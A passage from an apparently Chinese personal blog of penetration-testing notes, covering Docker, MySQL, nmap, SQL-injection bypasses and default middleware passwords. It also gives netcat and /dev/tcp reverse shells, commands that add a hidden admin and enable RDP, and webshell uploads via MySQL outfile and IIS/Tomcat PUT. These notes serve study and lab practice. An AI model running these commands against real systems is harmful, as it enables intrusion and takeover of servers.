<pre class="example">
备份源码、数据库
</pre>
</div>
</div>
<div id="outline-container-sec-14-2" class="outline-3">
<h3 id="sec-14-2"><span class="section-number-3">14.2</span> 修改口令</h3>
<div class="outline-text-3" id="text-14-2">
<pre class="example">
系统密码
</pre>
</div>
</div>
<div id="outline-container-sec-14-3" class="outline-3">
<h3 id="sec-14-3"><span class="section-number-3">14.3</span> 扫描服务</h3>
<div class="outline-text-3" id="text-14-3">
<pre class="example">
netstat -ano ps -aux nmap -p- x.x.x.x
</pre>
</div>
</div>
<div id="outline-container-sec-14-4" class="outline-3">
<h3 id="sec-14-4"><span class="section-number-3">14.4</span> 加固</h3>
<div class="outline-text-3" id="text-14-4">
<pre class="example">
web:
cms 后台管理修改路径,更改为一个不可攻击的页面
</pre>
</div>
</div>
<div id="outline-container-sec-14-5" class="outline-3">
<h3 id="sec-14-5"><span class="section-number-3">14.5</span> struts2</h3>
<div class="outline-text-3" id="text-14-5">
<pre class="example">
057
052
</pre>
</div>
</div>
</div>
<div id="outline-container-sec-15" class="outline-2">
<h2 id="sec-15"><span class="section-number-2">15</span> Docker使用</h2>
<div class="outline-text-2" id="text-15">
</div><div id="outline-container-sec-15-1" class="outline-3">
<h3 id="sec-15-1"><span class="section-number-3">15.1</span> docker基本命令</h3>
<div class="outline-text-3" id="text-15-1">
<pre class="example">
docker pull ubuntu 下载镜像
docker run --name host_name -itd -p 0.0.0.0:80:80 -v /var/www/thml:/root ubuntu bash 创建容器
docker ps 查看运行中的容器
docker ps -a 查看所有容器
docker start/stop/restart [container] 启动/停止/重启
docker rm -f 删除容器(-f运行中容器)
docker rmi 删除镜像
docker save -o test.tar test 打包镜像
docker load &lt; test.tar 导入镜像
</pre>
</div>
</div>
<div id="outline-container-sec-15-2" class="outline-3">
<h3 id="sec-15-2"><span class="section-number-3">15.2</span> docker给运行中的容器添加映射端口</h3>
<div class="outline-text-3" id="text-15-2">
<p>
1、将容器的8000端口映射到dokcer主机的8001端口
</p>
<pre class="example">
docker inspect webapp | grep IPAddress
iptables -t nat -A DOCKER -p tcp --dport 8001 -j DNAT --to-destination x.x.x.x:8000
</pre>
<p>
2、方法2
</p>
<pre class="example">
docker commit containerid foo/live 提交一个运行中的容器为镜像
docker run -d -p 8000:80 foo/live /bin/bash 运行镜像并添加端口
</pre>
</div>
</div>
<div id="outline-container-sec-15-3" class="outline-3">
<h3 id="sec-15-3"><span class="section-number-3">15.3</span> Docker remote api</h3>
<div class="outline-text-3" id="text-15-3">
<p>
docker remote api是一个取代远程命令行界面的Rest api。启动docker remote api方式如下:
</p>
<pre class="example">
dockerd -H unix:///var/run/docker.sock -H tcp://0.0.0.0:5678
</pre>
<p>
执行开机启动
</p>
<pre class="example">
#vi /etc/sysconfig/docker
other_args = " -H unix:///var/run/docker.sock -H tcp://0.0.0.0:5678"
#service docker restart
</pre>
<p>
docker验证配置
</p>
<pre class="example">
#docker -H localhost:5678 version
</pre>
</div>
</div>
<div id="outline-container-sec-15-4" class="outline-3">
<h3 id="sec-15-4"><span class="section-number-3">15.4</span> Dcos</h3>
<div class="outline-text-3" id="text-15-4">
<p>
dcos自动部署docker软件。
</p>
</div>
</div>
</div>
<div id="outline-container-sec-16" class="outline-2">
<h2 id="sec-16"><span class="section-number-2">16</span> Mysql使用</h2>
<div class="outline-text-2" id="text-16">
</div><div id="outline-container-sec-16-1" class="outline-3">
<h3 id="sec-16-1"><span class="section-number-3">16.1</span> mysql常用命令</h3>
<div class="outline-text-3" id="text-16-1">
<pre class="example">
show databases; 查看数据库
show tables; 查看数据库中表
use database_name; 选择数据库
select user(); 查看当前用户信息
select database(); 查看当前数据库
select schema(); 查看当前数据库
select user,host,password from mysql.user; 查询信息
update user set password=password('12') where user='jsf'; 更改密码
flush privileges; 刷新-更改系统配置之后
desc table_name;查看表结构
select 查询
update 更新
insert into 插入数据
delete 删除某条数据
drop 删除表 删除数据库
create 新建表 新建数据库
alter 更改表
grant 设置用户权限或新建用户 （需要更新权限 flush privileges）
create database test; 穿件数据库
grant all privileges on weixin.* to jsf1@'%' identified by '123456'; 创建用户及授权
grant select on dvwa.* to 'test'@'localhost' identified by 'test'; 分配dvwa数据库查询权限给test用户
show variables; 查看系统变量
</pre>
</div>
</div>
<div id="outline-container-sec-16-2" class="outline-3">
<h3 id="sec-16-2"><span class="section-number-3">16.2</span> sql注入</h3>
<div class="outline-text-3" id="text-16-2">
<p>
1、空格绕过
</p>
<pre class="example">
%0a %0b %a0 %09
()
`
+select+user+from`information_schema`.`schmata`where mysql特殊字符后面可以跟关键字
</pre>
<p>
2、php过滤单引号双引号
</p>
<pre class="example">
$id=mysql_real_escape_string($id)
在sql语句中必须对变量使用引号，否则此过滤失效。
</pre>
</div>
</div>
</div>
<div id="outline-container-sec-17" class="outline-2">
<h2 id="sec-17"><span class="section-number-2">17</span> 在信息安全中常用工具</h2>
<div class="outline-text-2" id="text-17">
</div><div id="outline-container-sec-17-1" class="outline-3">
<h3 id="sec-17-1"><span class="section-number-3">17.1</span> wireshark使用</h3>
<div class="outline-text-3" id="text-17-1">
<p>
1、wireshark数据包及关键字查询
</p>
<pre class="example">
http.request.method==POST &amp;&amp; http contains sgctf
http.request.method==POST &amp;&amp; http contains ctf
http.request.method==POST &amp;&amp; http contains flag
http.request.method==GET &amp;&amp; http contains sgctf
http.request.method==GET &amp;&amp; http contains ctf
http.request.method==GET &amp;&amp; http contains flag
</pre>
</div>
</div>
<div id="outline-container-sec-17-2" class="outline-3">
<h3 id="sec-17-2"><span class="section-number-3">17.2</span> 查看文件的md5值</h3>
<div class="outline-text-3" id="text-17-2">
<p>
1、linux系统下
</p>
<pre class="example">
md5sum file_name
</pre>
<p>
2、windows系统下
</p>
<pre class="example">
certutil -hashfile filename MD5
certutil -hashfile filename SHA1
certutil -hashfile filename SHA256
</pre>
</div>
</div>
<div id="outline-container-sec-17-3" class="outline-3">
<h3 id="sec-17-3"><span class="section-number-3">17.3</span> http流量</h3>
<div class="outline-text-3" id="text-17-3">
<p>
在http流量收集及攻击中我们会用到很多有用的工具如：Burp Suite、arpspoof、driftnet、sslstrip
等。
</p>
<pre class="example">
arpspoof:可以用来在局域网中进行arp攻击
driftnet:获取数据包中的图片，同时也支持抓取音频文件
</pre>
</div>
<div id="outline-container-sec-17-3-1" class="outline-4">
<h4 id="sec-17-3-1"><span class="section-number-4">17.3.1</span> http PUT方法</h4>
<div class="outline-text-4" id="text-17-3-1">
<p>
采用put方法可以上传非法文件及修改文件名称。
</p>
<pre class="example">
补丁更新服务关闭(webDAV)
</pre>
</div>
</div>
</div>
<div id="outline-container-sec-17-4" class="outline-3">
<h3 id="sec-17-4"><span class="section-number-3">17.4</span> 操作系统</h3>
<div class="outline-text-3" id="text-17-4">
<p>
1、在操作系统方面常用的工具有:nmap、tcpdump、wireshark、zmap、ettercap、metasploit等。
nmap使用(Winpcap)：
</p>
<pre class="example">
nmap -sn ip 开机状态
nmap -sP ip 通过Ping测试
nmap -Pn ip 监测全部端口
nmap -P0 ip 直接进行扫描
nmap -sN ip 执行tcp空扫描欺骗防火墙
nmap -p ip 指定端口，多个之间使用逗号隔开
nmap -O ip 识别远程操作系统
</pre>
<p>
2、命令行注入利用到的字符串
</p>
<pre class="example">
"&amp;" and "&amp;&amp;"
may be "|" or "||"
</pre>
</div>
</div>
<div id="outline-container-sec-17-5" class="outline-3">
<h3 id="sec-17-5"><span class="section-number-3">17.5</span> 数据库</h3>
<div class="outline-text-3" id="text-17-5">
<p>
数据库安全性测试过程中常用工具有sqlmap等
</p>
</div>
</div>
<div id="outline-container-sec-17-6" class="outline-3">
<h3 id="sec-17-6"><span class="section-number-3">17.6</span> 文件分析软件</h3>
<div class="outline-text-3" id="text-17-6">
<p>
对于非文本文件(jpg)的查看不能使用常用的文本编辑器，而是需要特殊的软件去分析文件中所隐含的信息，如使用hexdump、od我们可以查看到一些有用的信息。
</p>
</div>
</div>
</div>
<div id="outline-container-sec-18" class="outline-2">
<h2 id="sec-18"><span class="section-number-2">18</span> 常用中间件管理地址及默认帐号及漏洞利用</h2>
<div class="outline-text-2" id="text-18">
<p>
以下服务中可以通过默认帐号或者直接上传，我们已经制作好的后门war文件。
</p>
</div>
<div id="outline-container-sec-18-1" class="outline-3">
<h3 id="sec-18-1"><span class="section-number-3">18.1</span> windows常用命令</h3>
<div class="outline-text-3" id="text-18-1">
<pre class="example">
net user add likaikai 123456 /add //添加用户
net localgroup administrators likaikai /add  //添加到管理员组
query user //查询在线用户
logoff id //剔除在线用户，可以登录远程桌面
REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 0 /f //CMD开启查看3389端口 免重启 开启3389
start \\192.168.1.136\c$\Windows\ //当攻防时，为防止对方发现自己使用远程登录系统，则可以使用这个命令来访问对方文件
</pre>
</div>
</div>
<div id="outline-container-sec-18-2" class="outline-3">
<h3 id="sec-18-2"><span class="section-number-3">18.2</span> Weblogic</h3>
<div class="outline-text-3" id="text-18-2">
<pre class="example">
url: http://localhost:7001/console
username: weblogic
password: weblogic123
</pre>
</div>
</div>
<div id="outline-container-sec-18-3" class="outline-3">
<h3 id="sec-18-3"><span class="section-number-3">18.3</span> Tomcat</h3>
<div class="outline-text-3" id="text-18-3">
<pre class="example">
tomcat path:/usr/local/tomcat
url: http://localhost:8080
username: admin
password: 123
在极端情况下可以删除manager目录，从而web管理界面无法打开，需要重启服务

CVE-2017-12615 tomcat 8.5.19 put 漏洞，由conf/web.xml-&gt;readonly引起，设置为True即可解决问题
burp中put文件，PUT /jsf.jsp/ HTTP/1.1然后写上文件内容即可。
</pre>
</div>
</div>
<div id="outline-container-sec-18-4" class="outline-3">
<h3 id="sec-18-4"><span class="section-number-3">18.4</span> Jboos</h3>
<div class="outline-text-3" id="text-18-4">
<pre class="example">
url: http://localhost:8080
</pre>
</div>
</div>
<div id="outline-container-sec-18-5" class="outline-3">
<h3 id="sec-18-5"><span class="section-number-3">18.5</span> IIS漏洞使用</h3>
<div class="outline-text-3" id="text-18-5">
<p>
在上传文件中，在文件名称中添加asp/file.jpg后，就可以以php的方式去运行这个jpg文件，这样我们就可以上传后门代码值服务器。
</p>
</div>
</div>
</div>
<div id="outline-container-sec-19" class="outline-2">
<h2 id="sec-19"><span class="section-number-2">19</span> 日志分析</h2>
<div class="outline-text-2" id="text-19">
<p>
查看分析常见操作系统及中间件日志文件，apache日志、IP、时间、请求资源及方式、http状态码，
tomcat等软件。
</p>
</div>
</div>
<div id="outline-container-sec-20" class="outline-2">
<h2 id="sec-20"><span class="section-number-2">20</span> 工具使用实验</h2>
<div class="outline-text-2" id="text-20">
</div><div id="outline-container-sec-20-1" class="outline-3">
<h3 id="sec-20-1"><span class="section-number-3">20.1</span> nc软件使用</h3>
<div class="outline-text-3" id="text-20-1">
<p>
1、Windows nc反弹cmdshell
</p>
<pre class="example">
nc -lvp 8080 //本地执行
nc -e cmd.exe dest_ip 8080 //服务器执行
</pre>
<p>
2、Linux nc反弹shell
</p>
<pre class="example">
nc -lvp 8080 //本地执行
/bin/bash -i &gt;&amp; /dev/tcp/dest_ip 8080 0&gt;&amp;1 //服务器执行
</pre>
</div>
</div>
<div id="outline-container-sec-20-2" class="outline-3">
<h3 id="sec-20-2"><span class="section-number-3">20.2</span> 通过mysql服务向web目录读写文件</h3>
<div class="outline-text-3" id="text-20-2">
<p>
通过暴力破解获取远程mysql服务器登录权限，在数据库权限足够高的情况下可以读写网站的相关文件。
</p>
<pre class="example">
select 'test string' into outfile 'C:\www\jsf.php';
select load_file('C:\www\jsf.php');
</pre>
</div>
</div>
<div id="outline-container-sec-20-3" class="outline-3">
<h3 id="sec-20-3"><span class="section-number-3">20.3</span> IIS put漏洞使用</h3>
<div class="outline-text-3" id="text-20-3">
<p>
我们可以使用工具去扫描网站是否支持http put方法，如果检测发现能够使用put方法，我们就可以针对服务器进行进一步的攻击，我们可以上传恶意文件，然后可以进行修改文件信息等的操作。首先如图，
我们针对目标服务器进行扫描。
</p>


<div class="figure">
<p><img src="http://localhost:4000/assets/images/security/putscanner.png" alt="putscanner.png">
</p>
<p><span class="figure-number">Figure 10:</span> 进行服务器put扫描</p>
</div>

<p>
扫描到可以使用的put服务器之后，我们进一步针对某个页面查看，这个页面支持那些http方法，如图
</p>


<div class="figure">
<p><img src="http://localhost:4000/assets/images/security/httpoption.png" alt="httpoption.png">
</p>
<p><span class="figure-number">Figure 11:</span> 查看页面option</p>
</div>


<p>
然后，在本地准备一个名称jsfput.txt的文本文件，其中文件的内容为：
</p>


<div class="figure">
<p><img src="http://localhost:4000/assets/images/security/aspscript.png" alt="aspscript.png">
</p>
<p><span class="figure-number">Figure 12:</span> 服务器上传脚本文件内容</p>
</div>

<p>
接着在工具中我们选择使用put方法，将本地制作好的文件上传到服务器中，如图
</p>


<div class="figure">
<p><img src="http://localhost:4000/assets/images/security/putfile.png" alt="putfile.png">
</p>
<p><span class="figure-number">Figure 13:</span> put文件至服务器</p>
</div>

<p>
再使用move方法，将我们已经上传至服务器中的文件进行文件名称更改
</p>


<div class="figure">
<p><img src="http://localhost:4000/assets/images/security/filemove.png" alt="filemove.png">
</p>
<p><span class="figure-number">Figure 14:</span> 脚本文件名称修改</p>
</div>

<p>
名称修改成功之后，我们可以在菜刀软件中可以添加服务器中的脚本文件路径，并且在密码输入框中输入我们在脚本文件中定义好的密码字符，在下面选择相应的服务器执行语言后，点击添加，最后我们右键新输入的条目，就可以选择相应的功能。如文件浏览，虚拟终端等。
</p>


<div class="figure">
<p><img src="http://localhost:4000/assets/images/security/caidao.png" alt="caidao.png">
</p>
<p><span class="figure-number">Figure 15:</span> 将已攻击的网站信息添加到菜刀软件中</p>
</div>


<div class="figure">
<p><img src="http://localhost:4000/assets/images/security/caidaofile.png" alt="caidaofile.png">
</p>
<p><span class="figure-number">Figure 16:</span> 浏览网站文件</p>
</div>
</div>
</div>


<div id="outline-container-sec-20-4" class="outline-3">
<h3 id="sec-20-4"><span class="section-number-3">20.4</span> Metasploit 渗透Windos7</h3>
<div class="outline-text-3" id="text-20-4">
<p>
使用metasploit可以方便的进行渗透实验，我们可以在kaililinux操作系统中使用已经安装好的工具
metasploit来对某些主机进行渗透实验，在本实验中我们选择一台主机作为被攻击对象，首先使用工具
nmap来查看目标主机开发了那些服务，然后我们就可以针对开启的服务进行选择性的攻击。
</p>


<div class="figure">
<p><img src="http://localhost:4000/assets/images/security/nmap.png" alt="nmap.png">
</p>
<p><span class="figure-number">Figure 17:</span> 扫描端口</p>
</div>

<p>
我们可以从中发现在目标主机中开启了445端口，然后我们可以针对这个漏洞做一些操作，按照下面的步骤我们就可以进入远程主机。
</p>


<div class="figure">
<p><img src="http://localhost:4000/assets/images/security/use.png" alt="use.png" width="85%">
</p>
<p><span class="figure-number">Figure 18:</span> 设置</p>
</div>


<div class="figure">
<p><img src="http://localhost:4000/assets/images/security/setRhost.png" alt="setRhost.png">
</p>
<p><span class="figure-number">Figure 19:</span> 设置远程主机</p>
</div>


<div class="figure">
<p><img src="http://localhost:4000/assets/images/security/exploit.png" alt="exploit.png" width="85%">
</p>
<p><span class="figure-number">Figure 20:</span> 开始进行渗透</p>
</div>

<p>
经过上面的操作我们可以看到kalilinux已经和目标主机之间建立了通行，接下来我们就可以查看目标主机的信息并且获取目标主机shell权限来执行一些脚本。
</p>


<div class="figure">
<p><img src="http://localhost:4000/assets/images/security/sysinfo.png" alt="sysinfo.png">
</p>
<p><span class="figure-number">Figure 21:</span> 查看系统信息</p>
</div>


<div class="figure">
<p><img src="http://localhost:4000/assets/images/security/script.png" alt="script.png">
</p>
<p><span class="figure-number">Figure 22:</span> 执行脚本</p>
</div>
</div>
</div>
<div id="outline-container-sec-20-5" class="outline-3">
<h3 id="sec-20-5"><span class="section-number-3">20.5</span> .cgi为文件后缀名漏洞使用</h3>
<div class="outline-text-3" id="text-20-5">
<p>
如果发现网站上有.cgi为后缀名称的文件时，我们可以尝试使用反弹shell利用，在本机执行如下两条命令之后，我们就有可能获取到服务器的shell权限。
</p>


<div class="figure">
<p><img src="http://localhost:4000/assets/images/security/ncshell.png" alt="ncshell.png">
</p>
<p><span class="figure-number">Figure 23:</span> 打开本地监听端口</p>
</div>


<div class="figure">
<p><img src="http://localhost:4000/assets/images/security/cgishell.png" alt="cgishell.png" width="85%">
</p>
<p><span class="figure-number">Figure 24:</span> 漏洞利用远程主机连接至本地监听</p>
</div>
</div>
</div>
<div id="outline-container-sec-20-6" class="outline-3">
<h3 id="sec-20-6"><span class="section-number-3">20.6</span> jboss java反序列化工具使用</h3>
<div class="outline-text-3" id="text-20-6">
<p>
当我们发现在服务器上使用了jboss软件服务时，我们就可以尝试使用这个工具去尝试对网站进行一些信息的收集、命令执行及webshell上传等操作。
</p>


<div class="figure">
<p><img src="http://localhost:4000/assets/images/security/jbossjava.png" alt="jbossjava.png">
</p>
</div>



<!-- more-forword -->


<!-- more -->
</div>
</div>
</div>


      
    </div>

    <div>
      
        

      
    </div>

    <div>
      
        

      
    </div>

    <div>
      
        

      
    </div>

    <footer class="post-footer">
      
        <div class="post-tags">
          
            
            <a href="/tag/#/Shell" rel="tag"># Shell</a>
          
            
            <a href="/tag/#/Dos" rel="tag"># Dos</a>
          
            
            <a href="/tag/#/PHP" rel="tag"># PHP</a>
          
            
            <a href="/tag/#/Mysql" rel="tag"># Mysql</a>
          
        </div>
      

      
      
      
      
      

      
      
        <div class="post-nav" id="post-nav-id">
          <div class="post-nav-next post-nav-item">
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/linux/2019/01/07/linux%E9%98%B2%E7%81%AB%E5%A2%99/" rel="prev" title="Linux防火墙">
                Linux防火墙 <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      
      

      
    </footer>
  </article>

  <div class="post-spread">
    
  </div>
</div>


          </div>
          


          
  <div class="comments" id="comments">
    
  </div>


        </div>
        
          

  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    <div class="sidebar-inner">

      
        
        
        







      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
            文章目录
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview">
            站点概览
          </li>
        </ul>
      

      <section class="site-overview sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
          <img class="site-author-image" itemprop="image"
               src="/assets/images/logo.png"
               alt="jsf" />
          <p class="site-author-name" itemprop="name">jsf</p>
           
              <p class="site-description motion-element" itemprop="description">个人笔记</p>
          
        </div>
        <nav class="site-state motion-element">

          
            <div class="site-state-item site-state-posts">
              <a href="/archives/">
                <span class="site-state-item-count">8</span>
                <span class="site-state-item-name">日志</span>
              </a>
            </div>
          

          
            
            
            <div class="site-state-item site-state-categories">
              <a href="/categories/">
                <span class="site-state-item-count">5</span>
                <span class="site-state-item-name">分类</span>
              </a>
            </div>
          

          
            
            
            <div class="site-state-item site-state-tags">
              <a href="/tags/">
                <span class="site-state-item-count">7</span>
                <span class="site-state-item-name">标签</span>
              </a>
            </div>
          

        </nav>

        
        
        
          <div class="feed-link motion-element">
            <a href="/atom.xml" rel="alternate">
              <i class="fa fa-rss"></i>
              RSS
            </a>
          </div>
        

        <div class="links-of-author motion-element">
          
        </div>

        
        

        
        

        


      </section>

      
      <!--noindex-->
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
            
            
            








            
              <div class="post-toc-content">
    <ol class=nav>
      <li class="nav-item nav-level-2"> <a class="nav-link" href="#sec-1"> <span class="nav-number">1</span> <span class="nav-text">1 网络攻防基本介绍</span> </a> <ol class="nav-child"> <li class="nav-item nav-level-3"> <a class="nav-link" href="#sec-1-1"> <span class="nav-number">1.1</span> <span class="nav-text">1.1 渗透测试分类</span> </a> <ol class="nav-child"> <li class="nav-item nav-level-4"> <a class="nav-link" href="#sec-1-1-1"> <span class="nav-number">1.1.1</span> <span class="nav-text">1.1.1 黑盒测试</span> </a> </li> <li class="nav-item nav-level-4"> <a class="nav-link" href="#sec-1-1-2"> <span class="nav-number">1.1.2</span> <span class="nav-text">1.1.2 白盒测试</span> </a> </li> <li class="nav-item nav-level-4"> <a class="nav-link" href="#sec-1-1-3"> <span class="nav-number">1.1.3</span> <span class="nav-text">1.1.3 灰盒测试</span> </a> </li> </ol> </li> </ol> </li> <li class="nav-item nav-level-2"> <a class="nav-link" href="#sec-2"> <span class="nav-number">2</span> <span class="nav-text">2 渗透测试</span> </a> <ol class="nav-child"> <li class="nav-item nav-level-3"> <a class="nav-link" href="#sec-2-1"> <span class="nav-number">2.1</span> <span class="nav-text">2.1 术语</span> </a> </li> <li class="nav-item nav-level-3"> <a class="nav-link" href="#sec-2-2"> <span class="nav-number">2.2</span> <span class="nav-text">2.2 常见攻击</span> </a> </li> <li class="nav-item nav-level-3"> <a class="nav-link" href="#sec-2-3"> <span class="nav-number">2.3</span> <span class="nav-text">2.3 流程</span> </a> </li> <li class="nav-item nav-level-3"> <a class="nav-link" href="#sec-2-4"> <span class="nav-number">2.4</span> <span class="nav-text">2.4 HTTP协议抓包工具</span> </a> </li> </ol> </li> <li class="nav-item nav-level-2"> <a class="nav-link" href="#sec-3"> <span class="nav-number">3</span> <span class="nav-text">3 Burp Suite使用</span> </a> <ol class="nav-child"> <li class="nav-item nav-level-3"> <a class="nav-link" href="#sec-3-1"> <span class="nav-number">3.1</span> <span class="nav-text">3.1 Target</span> </a> </li> <li class="nav-item nav-level-3"> <a class="nav-link" href="#sec-3-2"> <span class="nav-number">3.2</span> <span class="nav-text">3.2 Proxy</span> </a> </li> <li class="nav-item nav-level-3"> <a class="nav-link" href="#sec-3-3"> <span class="nav-number">3.3</span> <span class="nav-text">3.3 Spider</span> </a> </li> <li class="nav-item nav-level-3"> <a class="nav-link" href="#sec-3-4"> <span class="nav-number">3.4</span> <span class="nav-text">3.4 Scaner</span> </a> </li> <li class="nav-item nav-level-3"> <a class="nav-link" href="#sec-3-5"> <span class="nav-number">3.5</span> <span class="nav-text">3.5 Intruder</span> </a> </li> </ol> </li> <li class="nav-item nav-level-2"> <a class="nav-link" href="#sec-4"> <span class="nav-number">4</span> <span class="nav-text">4 HTTP协议</span> </a> <ol class="nav-child"> <li class="nav-item nav-level-3"> <a class="nav-link" href="#sec-4-1"> <span class="nav-number">4.1</span> <span class="nav-text">4.1 http协议请求类型</span> </a> </li> <li class="nav-item nav-level-3"> <a class="nav-link" href="#sec-4-2"> <span class="nav-number">4.2</span> <span class="nav-text">4.2 http状态码</span> </a> </li> </ol> </li> <li class="nav-item nav-level-2"> <a class="nav-link" href="#sec-5"> <span class="nav-number">5</span> <span class="nav-text">5 DVWA暴力破解</span> </a> <ol class="nav-child"> <li class="nav-item nav-level-3"> <a class="nav-link" href="#sec-5-1"> <span class="nav-number">5.1</span> <span class="nav-text">5.1 暴力破解定义</span> </a> <ol class="nav-child"> <li class="nav-item nav-level-4"> <a class="nav-link" href="#sec-5-1-1"> <span class="nav-number">5.1.1</span> <span class="nav-text">5.1.1 常见分类</span> </a> </li> <li class="nav-item nav-level-4"> <a class="nav-link" href="#sec-5-1-2"> <span class="nav-number">5.1.2</span> <span class="nav-text">5.1.2 暴力破解DVWA</span> </a> </li> <li class="nav-item nav-level-4"> <a class="nav-link" href="#sec-5-1-3"> <span class="nav-number">5.1.3</span> <span class="nav-text">5.1.3 万能密码</span> </a> </li> <li class="nav-item nav-level-4"> <a class="nav-link" href="#sec-5-1-4"> <span class="nav-number">5.1.4</span> <span class="nav-text">5.1.4 sql注入破解密码</span> </a> </li> </ol> </li> </ol> </li> <li class="nav-item nav-level-2"> <a class="nav-link" href="#sec-6"> <span class="nav-number">6</span> <span class="nav-text">6 SQL注入</span> </a> <ol class="nav-child"> <li class="nav-item nav-level-3"> <a class="nav-link" href="#sec-6-1"> <span class="nav-number">6.1</span> <span class="nav-text">6.1 mysql修改密码</span> </a> </li> <li class="nav-item nav-level-3"> <a class="nav-link" href="#sec-6-2"> <span class="nav-number">6.2</span> <span class="nav-text">6.2 sql注入类型</span> </a> </li> <li class="nav-item nav-level-3"> <a class="nav-link" href="#sec-6-3"> <span class="nav-number">6.3</span> <span class="nav-text">6.3 注入方式</span> </a> </li> <li class="nav-item nav-level-3"> <a class="nav-link" href="#sec-6-4"> <span class="nav-number">6.4</span> <span class="nav-text">6.4 sqlmap常用命令</span> </a> </li> <li class="nav-item nav-level-3"> <a class="nav-link" href="#sec-6-5"> <span class="nav-number">6.5</span> <span class="nav-text">6.5 手动注入以DVWA为例</span> </a> </li> <li class="nav-item nav-level-3"> <a class="nav-link" href="#sec-6-6"> <span class="nav-number">6.6</span> <span class="nav-text">6.6 SQLserver开启xpcmdshell功能</sub</span> </a> </li> <li class="nav-item nav-level-3"> <a class="nav-link" href="#sec-6-7"> <span class="nav-number">6.7</span> <span class="nav-text">6.7 mysql数据库结构</span> </a> </li> </ol> </li> <li class="nav-item nav-level-2"> <a class="nav-link" href="#sec-7"> <span class="nav-number">7</span> <span class="nav-text">7 文件包含</span> </a> <ol class="nav-child"> <li class="nav-item nav-level-3"> <a class="nav-link" href="#sec-7-1"> <span class="nav-number">7.1</span> <span class="nav-text">7.1 php中常用四个文件包含函数</span> </a> </li> <li class="nav-item nav-level-3"> <a class="nav-link" href="#sec-7-2"> <span class="nav-number">7.2</span> <span class="nav-text">7.2 php伪协议</span> </a> </li> </ol> </li> <li class="nav-item nav-level-2"> <a class="nav-link" href="#sec-8"> <span class="nav-number">8</span> <span class="nav-text">8 XSS漏洞攻击</span> </a> <ol class="nav-child"> <li class="nav-item nav-level-3"> <a class="nav-link" href="#sec-8-1"> <span class="nav-number">8.1</span> <span class="nav-text">8.1 xss反射型</span> </a> </li> <li class="nav-item nav-level-3"> <a class="nav-link" href="#sec-8-2"> <span class="nav-number">8.2</span> <span class="nav-text">8.2 同源策略</span> </a> </li> <li class="nav-item nav-level-3"> <a class="nav-link" href="#sec-8-3"> <span class="nav-number">8.3</span> <span class="nav-text">8.3 xss存储型攻击</span> </a> </li> <li class="nav-item nav-level-3"> <a class="nav-link" href="#sec-8-4"> <span class="nav-number">8.4</span> <span class="nav-text">8.4 DOM型xss攻击</span> </a> </li> <li class="nav-item nav-level-3"> <a class="nav-link" href="#sec-8-5"> <span class="nav-number">8.5</span> <span class="nav-text">8.5 php防御</span> </a> </li> </ol> </li> <li class="nav-item nav-level-2"> <a class="nav-link" href="#sec-9"> <span class="nav-number">9</span> <span class="nav-text">9 文件上传漏洞攻击</span> </a> <ol class="nav-child"> <li class="nav-item nav-level-3"> <a class="nav-link" href="#sec-9-1"> <span class="nav-number">9.1</span> <span class="nav-text">9.1 文件上传JS验证</span> </a> </li> <li class="nav-item nav-level-3"> <a class="nav-link" href="#sec-9-2"> <span class="nav-number">9.2</span> <span class="nav-text">9.2 文件上传MIME验证</span> </a> </li> <li class="nav-item nav-level-3"> <a class="nav-link" href="#sec-9-3"> <span class="nav-number">9.3</span> <span class="nav-text">9.3 服务端扩展名验证</span> </a> </li> <li class="nav-item nav-level-3"> <a class="nav-link" href="#sec-9-4"> <span class="nav-number">9.4</span> <span class="nav-text">9.4 文件内容更改</span> </a> </li> </ol> </li> <li class="nav-item nav-level-2"> <a class="nav-link" href="#sec-10"> <span class="nav-number">10</span> <span class="nav-text">10 CSRF攻击</span> </a> </li> <li class="nav-item nav-level-2"> <a class="nav-link" href="#sec-11"> <span class="nav-number">11</span> <span class="nav-text">11 SSRF</span> </a> <ol class="nav-child"> <li class="nav-item nav-level-3"> <a class="nav-link" href="#sec-11-1"> <span class="nav-number">11.1</span> <span class="nav-text">11.1 php</span> </a> </li> </ol> </li> <li class="nav-item nav-level-2"> <a class="nav-link" href="#sec-12"> <span class="nav-number">12</span> <span class="nav-text">12 攻防</span> </a> </li> <li class="nav-item nav-level-2"> <a class="nav-link" href="#sec-13"> <span class="nav-number">13</span> <span class="nav-text">13 php相关</span> </a> <ol class="nav-child"> <li class="nav-item nav-level-3"> <a class="nav-link" href="#sec-13-1"> <span class="nav-number">13.1</span> <span class="nav-text">13.1 回调函数</span> </a> </li> <li class="nav-item nav-level-3"> <a class="nav-link" href="#sec-13-2"> <span class="nav-number">13.2</span> <span class="nav-text">13.2 php脚本函数执行</span> </a> </li> <li class="nav-item nav-level-3"> <a class="nav-link" href="#sec-13-3"> <span class="nav-number">13.3</span> <span class="nav-text">13.3 一句话木马</span> </a> </li> </ol> </li> <li class="nav-item nav-level-2"> <a class="nav-link" href="#sec-14"> <span class="nav-number">14</span> <span class="nav-text">14 JAVA</span> </a> <ol class="nav-child"> <li class="nav-item nav-level-3"> <a class="nav-link" href="#sec-14-1"> <span class="nav-number">14.1</span> <span class="nav-text">14.1 备份</span> </a> </li> <li class="nav-item nav-level-3"> <a class="nav-link" href="#sec-14-2"> <span class="nav-number">14.2</span> <span class="nav-text">14.2 修改口令</span> </a> </li> <li class="nav-item nav-level-3"> <a class="nav-link" href="#sec-14-3"> <span class="nav-number">14.3</span> <span class="nav-text">14.3 扫描服务</span> </a> </li> <li class="nav-item nav-level-3"> <a class="nav-link" href="#sec-14-4"> <span class="nav-number">14.4</span> <span class="nav-text">14.4 加固</span> </a> </li> <li class="nav-item nav-level-3"> <a class="nav-link" href="#sec-14-5"> <span class="nav-number">14.5</span> <span class="nav-text">14.5 struts2</span> </a> </li> 